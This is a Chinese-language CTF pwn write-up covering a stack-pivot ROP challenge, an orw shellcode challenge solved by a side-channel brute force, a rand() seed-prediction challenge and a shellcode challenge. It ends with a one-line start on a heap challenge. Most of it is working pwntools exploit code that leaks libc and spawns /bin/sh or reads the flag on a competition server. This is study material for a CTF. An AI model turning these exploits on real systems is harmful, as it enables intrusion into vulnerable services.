
### Stack Pivoting

有0x10的溢出空间，问题在于如何只利用一次溢出，迁移栈的同时读入ROPchain

通过返回到特定函数中的read部分能够做到这一点，后续随便打

exp:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

binary_path = './attachment'
gdb_script = "b *0x4011CD\n"
gdb_script += "\n"
gdb_script += "c\n"
domain = "27.25.151.198"
port = 37224
global io, gdb_io
elf = ELF(binary_path)
libc = ELF("./libc.so.6")


def connect(isLocal, isGDB, isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)
            return io, gdb_io
        else:
            io = gdb.debug(binary_path, gdb_script)
            return io
    else:
        io = process(binary_path)
        return io


def attack(io):
    leave_ret = 0x4011CE
    pop_rdi = 0x401263
    ret = 0x40101a
    func = 0x40119F
    rbp = 0x404800 #第一次设置为0x404500，会在执行过程中下降到0x403fxx左右，导致内存错 误
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    payload = cyclic(0x40) + p64(rbp) + p64(0x4011B7)
    io.sendafter("can you did ?", payload)
    payload = cyclic(0x48) + p64(func)
    io.send(payload)
    rops = [
        p64(pop_rdi),  # pop rdi; ret
        p64(puts_got),  # puts got
        p64(puts_plt),  # puts plt
        p64(func),  # ret to func
    ]
    payload = flat(rops).ljust(0x40, b'\x00') + p64(0x4047c0) + p64(leave_ret)
    io.sendafter("can you did ?\n", payload)
    puts_addr = u64(io.recv(6).ljust(0x8, b"\x00"))
    log.info("puts addr: " + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    log.info("libc base: " + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + libc.search(b"/bin/sh").__next__()
    log.info("system addr: " + hex(system_addr))
    log.info("binsh addr: " + hex(binsh_addr))
    rops = [
        p64(pop_rdi),  # pop rdi; ret
        p64(binsh_addr),
        p64(system_addr),  # system("/bin/sh")
    ]
    payload = flat(rops).ljust(0x40, b'\x00') + p64(0x4047a0-8) + p64(leave_ret)
    io.sendline(payload)
    io.interactive()
if __name__ == '__main__':
    io = connect(False, True, False)
    attack(io)
```

### shellcode

LitCTF做过几乎一模一样的原题，区别在于那道题只允许了open、read调用，因此只能打侧信道爆破。而这道题虽然禁用了write、sendfile，但允许writev调用，也是可以不打侧信道爆破的。

为了方便我直接拿LitCTF的脚本改改上去打了

exp：

```python
from pwn import *
context(arch='amd64', os='linux')

binary_path = './pwn'
domain = "27.25.151.198"
port = 43787

def attack():
    def exp(dis, char):
        shellcode = '''
            mov r10, rax
            add r10, 0xf8
            mov rax, 2
            mov rdi, r10
            xor rsi, rsi
            xor rdx, rdx
            syscall
            xor rax, rax
            mov rdi, 3
            sub r10, 0x88
            mov rsi, r10
            mov rdx, 0x30
            syscall
            mov dl, byte ptr [rsi+{}]
            mov cl, {}
            cmp cl,dl
            jz loop
            mov al,60
            syscall
            loop:
            jmp loop
        '''.format(dis,char)
        shellcode = asm(shellcode)
        shellcode = shellcode.ljust(0x100-8, b'\x90')
        shellcode += b'./flag\x00\x00'
        io.recvuntil(b"Enter your command: ")
        io.sendline(shellcode)
    flag = ""
    chars = list(range(0x30, 0x3a)) + list(range(0x60, 0x7e))
    print("start!")
    for i in range(33,60):
        print("flag:"+flag)
        for j in chars:
            io = remote(domain, port)
            try:
                print("pos: {}, char: {}".format(i, chr(j)))
                exp(i,j)
                io.recvline(timeout=10)
                flag += chr(j)
                io.send('\n')
                log.success("{} pos : {} success".format(i,chr(j)))
                io.close()
                break
            except:
                io.close()

if __name__ == '__main__':
    attack()
```

flag{ced59a09-66d7-4eeb-a77f-eedc77ea2600}

### PDD 伪随机数预测

题目：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-18h] BYREF
  int v5; // [rsp+Ch] [rbp-14h]
  unsigned int v6; // [rsp+10h] [rbp-10h]
  unsigned int seed; // [rsp+14h] [rbp-Ch]
  int j; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  init(argc, argv, envp);
  seed = time(0LL);
  v6 = 8;
  srand(seed);
  v5 = rand();
  srand(v5 % 5 - 0x2A20B9D);
  puts(&byte_402023);                           // 你以前打过ctf吗
  puts(&byte_402040);                           // 现在只需要5次助力就能获得flag
  puts("game1 begin\n");
  for ( i = 1; i <= 55; ++i )
  {
    puts("good!");
    __isoc99_scanf("%d", &v4);
    if ( rand() % 4 + 1 != v4 )
    {
      puts("Your flag has been stolen by a mouse.");
      return 0;
    }
  }
  puts(
    "Congratulations! Since you have participated in the CTF competitions multiple times, the difficulty level has now dr"
    "opped directly to the easiest.\n");
  puts("You have outperformed over 99.99% of the contestants.\n");
  puts("Your friend 'Genshin Impact Start' has obtained the flag through assistance. You'll be the next one.\n");
  puts("You only need one more boost to get the flag.\n");
  puts("game2 begin\n");
  srand(v6);
  for ( j = 1; j <= 55; ++j )
  {
    puts("good!");
    __isoc99_scanf("%d", &v4);
    if ( rand() % 4 + 8 != v4 )
    {
      puts("Your flag has been stolen by a mouse.\n");
      return 0;
    }
  }
  puts("You've collected the last piece of the puzzle. Now you just need to invite one more new user to get the flag.\n");
  func();
  return 0;
}
```

- 基于`time(0LL)`的随机数预测
- 基于`srand(常数)`的随机数预测

针对前者，编写poc：

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int random_number() {
    unsigned int seed = time(0LL);
    srand(seed);
    int v5 = rand();
    srand(v5 % 5 - 0x2a20b9d);
    for (int i = 1; i <= 55; ++i) {
        int num = rand();
        printf("%d\n", num%4+1);
    }
}

int main() {
    random_number();
    return 0;
}
```

针对后者，编写poc：

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int random_number() {
    int v6 = 8;
    srand(v6);
    for (int i = 1; i <= 55; ++i) {
        int num = rand();
        printf("%d\n", num%4+8);
    }
}

int main() {
    random_number();
    return 0;
}
```

将这两个poc与目标程序同时运行，接收poc的随机数输出并输入到目标程序中

最终exp：

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

binary_path = './attachment'
gdb_script = "b *0x40132D\n"
gdb_script += "b *0x40134D\n"
gdb_script += "b *0x4013FE\n"
gdb_script += "c\n"
domain = "27.25.151.198"
port = 33887
global io, gdb_io
elf = ELF(binary_path)
libc = ELF('./libc.so.6')


def connect(isLocal, isGDB, isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)
            return io, gdb_io
        else:
            io = gdb.debug(binary_path, gdb_script)
            return io
    else:
        io = process(binary_path)
        return io


def attack(io):
    poc1 = process("./poc1")
    for i in range(55):
        number = int(poc1.recvline())
        io.sendlineafter(b"good!",str(number))
    poc2 = process("./poc2") 
    for i in range(55):
        number = int(poc2.recvline())
        io.sendlineafter(b"good!",str(number))
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    ret_addr = elf.symbols['func']
    pop_rdi = 0x401483
    ret = 0x40101a
    payload = cyclic(0x38) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
    io.sendlineafter(b"Congratulations young man.\n", payload)
    puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
    log.success(f'puts_addr: {hex(puts_addr)}')
    libc_base = puts_addr - libc.symbols['puts']
    log.success(f'libc_base: {hex(libc_base)}')
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
    log.success(f'system_addr: {hex(system_addr)}')
    payload = cyclic(0x38) + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
    io.sendlineafter(b"Congratulations young man.\n", payload)
    io.interactive()
    
if __name__ == '__main__':
    io = connect(False, True, False)
    #需要尝试多次因为time()可能因为python性能原因有一定的输出结果差异
    while(True):
        try:
            attack(io)
            break
        except EOFError:
            log.info("EOFError, retrying...")
            io = connect(False, True, False)
        except Exception as e:
            log.error(f"An error occurred: {e}")
            break
```

### 三步走战略

exp:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

binary_path = './vuln'
gdb_script = "b *0x401414\n"
gdb_script += "\n"
gdb_script += "c\n"
domain = "27.25.151.198"
port = 34109
global io, gdb_io
elf = ELF(binary_path)


def connect(isLocal, isGDB, isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)
            return io, gdb_io
        else:
            io = gdb.debug(binary_path, gdb_script)
            return io
    else:
        io = process(binary_path)
        return io


def attack(io):
    io.send(b"\x0a")
    mmap = 0x1337000
    orw=shellcraft.open('./flag')
    orw+=shellcraft.read(3,mmap+0x100,0x50)
    orw+=shellcraft.write(1,mmap+0x100,0x50)
    shellcode = asm(orw)
    io.sendlineafter("Please speak", shellcode)
    payload = cyclic(0x48) + p64(0x1337000)
    io.sendlineafter("Do you have anything else to say?", payload)
    io.interactive()

if __name__ == '__main__':
    io = connect(False, True, False)
    attack(io)
```

### 梦中情pwn

虽然是堆题，但是没给libc，也不知道libc版本

